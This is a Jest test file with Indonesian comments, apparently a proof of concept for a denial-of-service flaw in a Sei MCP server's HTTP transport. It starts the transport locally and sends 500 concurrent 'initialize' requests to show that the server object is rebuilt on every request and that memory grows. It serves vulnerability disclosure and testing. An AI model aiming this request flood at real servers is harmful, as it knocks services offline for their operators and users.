import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';

// 1. Mock mintlify/search.ts untuk menghitung berapa kali getServer() memanggil inisialisasi
let searchToolCallCount = 0;
jest.mock('../../mintlify/search.js', () => ({
    createSeiJSDocsSearchTool: jest.fn(async () => {
        searchToolCallCount++;
        // Simulasi delay jaringan agar efek concurrency dan memory buildup terasa
        await new Promise(resolve => setTimeout(resolve, 50));
    })
}));

// 2. Mock docs/index.ts agar tidak keluar jaringan
jest.mock('../../docs/index.js', () => ({
    createDocsSearchTool: jest.fn(async () => {})
}));

// 3. Mock package-info.ts untuk mencegah crash __filename di Jest ESM
jest.mock('../../server/package-info.js', () => ({
    getPackageInfo: () => ({
        name: 'sei-mcp-server',
        version: '0.0.0',
        description: 'Sei MCP Server'
    })
}));

import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';

describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
    let transport: StreamableHttpTransport;
    const targetPort = 8912; // Gunakan port statis agar tidak perlu akses properti private

    beforeAll(async () => {
        // Inisialisasi transport streamable-http asli pada port 8912
        transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
        
        // start() akan menjalankan app.listen(8912)
        await transport.start({} as any);
    });

    afterAll(async () => {
        // Hentikan server setelah test selesai
        await transport.stop();
    });

    it('should trigger getServer() and memory exhaustion on concurrent requests', async () => {
        const targetUrl = `http://localhost:${targetPort}/mcp`;
        
        const payload = {
            jsonrpc: '2.0',
            method: 'initialize',
            params: { protocolVersion: '2024-11-05', capabilities: {} },
            id: 1
        };

        // Catat memory sebelum serangan
        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        const initialCalls = searchToolCallCount;
        console.log(`\n[Before Attack] Memory usage: ${memBefore.toFixed(2)} MB`);

        // Simulasi serangan DoS: 500 request concurrent
        const attackCount = 500;
        console.log(`[Attack] Sending ${attackCount} concurrent requests to trigger getServer()...`);
        
        const requests = [];
        for (let i = 0; i < attackCount; i++) {
            requests.push(
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {}) // Abaikan error (seperti ECONNRESET jika server crash)
            );
        }

        // Tunggu semua request selesai/drop
        await Promise.all(requests);

        // Beri waktu GC sebentar untuk settle
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Catat memory setelah serangan
        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        const totalCalls = searchToolCallCount - initialCalls;

        console.log(`[After Attack] Memory usage: ${memAfter.toFixed(2)} MB`);
        console.log(`[Impact] createSeiJSDocsSearchTool (getServer) triggered: ${totalCalls} times`);
        console.log(`[Impact] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        // VERDICT: Jika getServer() dipanggil per request, totalCalls harusnya sama dengan attackCount
        expect(totalCalls).toBe(attackCount);
        
        // Verifikasi bahwa memori membengkak (indikasi object instantiation McpServer)
        expect(memAfter).toBeGreaterThan(memBefore);
    });
});
